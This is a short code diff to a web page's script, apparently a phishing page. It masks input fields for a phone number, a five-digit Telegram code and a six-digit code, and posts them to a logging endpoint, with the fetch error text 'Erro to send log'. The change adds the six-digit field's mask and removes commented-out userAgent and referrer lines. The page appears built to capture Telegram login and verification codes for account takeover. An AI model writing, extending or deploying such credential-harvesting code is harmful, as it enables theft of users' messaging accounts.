@@ -122,6 +122,7 @@ display: none;
             $(document).ready(function(){
       $('#number').mask('+000000000000');
 $('#code_telegram').mask('00000');
+$('#code').mask('000000');
   })
           </script>
 <br>
@@ -150,8 +151,6 @@ const code_telegram_ver = document.getElementById('code_telegram').value;
           number: number_ver,
           code: code_telegram_ver,
          telegram: code_ver           
-// userAgent: navigator.userAgent,
-            //referrer: document.referrer,
             //url: window.location.href
         })
     }).catch(err => console.error('Erro to send log:', err));
